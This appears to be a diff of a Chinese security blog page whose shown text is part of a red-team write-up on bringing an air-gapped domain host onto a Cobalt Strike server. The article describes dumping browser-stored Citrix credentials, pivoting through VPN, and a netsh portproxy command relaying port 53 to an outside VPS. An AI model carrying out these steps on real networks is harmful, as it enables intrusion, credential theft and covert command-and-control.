@@ -20,7 +20,7 @@
 <meta property="og:image" content="http://example.com/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/image-20210527170511889.png">
 <meta property="og:image" content="http://example.com/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/image-20210527170641484.png">
 <meta property="article:published_time" content="2021-05-27T07:35:43.000Z">
-<meta property="article:modified_time" content="2021-05-27T09:18:13.190Z">
+<meta property="article:modified_time" content="2021-05-27T09:21:52.509Z">
 <meta property="article:author" content="huahua">
 <meta property="article:tag" content="实战攻防">
 <meta name="twitter:card" content="summary">
@@ -184,7 +184,7 @@
 <span id="more"></span>
 
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="1、突破网段"><a href="#1、突破网段" class="headerlink" title="1、突破网段"></a>1、突破网段</h4><p>通过浏览器凭证dump工具dump出citrix云桌面的账号密码以及登录地址。挂上代理直接下载citrix连接工具拨过去即通过vpn突破至了另一个带域的网段，且该网段不出网。</p>
-<h3 id="2、上线不出网主机"><a href="#2、上线不出网主机" class="headerlink" title="2、上线不出网主机"></a>2、上线不出网主机</h3><p>由于我们控制不出网主机目前是以citrix云桌面控制的，如果在白天我们肯定不能这样操作的，因为这些机器都是有主的，白天都是有人使用这些机器，因此我们需要想办法把他上线的cs上，这样我们白天的时候也可以打内网了。以下把不出网主机命名为A。</p>
+<h4 id="2、上线不出网主机"><a href="#2、上线不出网主机" class="headerlink" title="2、上线不出网主机"></a>2、上线不出网主机</h4><p>由于我们控制不出网主机目前是以citrix云桌面控制的，如果在白天我们肯定不能这样操作的，因为这些机器都是有主的，白天都是有人使用这些机器，因此我们需要想办法把他上线的cs上，这样我们白天的时候也可以打内网了。以下把不出网主机命名为A。</p>
 <h5 id="路径一"><a href="#路径一" class="headerlink" title="路径一"></a>路径一</h5><p>首先尝试了A与我控制的出网主机是否连同，最后发现主机和我控制的一台出网机器B可以ping可以通。因此我首先尝试netsh将所有访问B的53端口的流量都转到vps的8080端口，随后我用A certutil访问B的53，发现并不连通。后来我又把53换成了110、80、7001发现都不行。再后来我又把A和B的主机防火墙全部关闭，发现还是不行。可以大致判断是网络端做了限制。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;53 listenaddress&#x3D;0.0.0.0 connectport&#x3D;8080 connectaddress&#x3D;xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
 
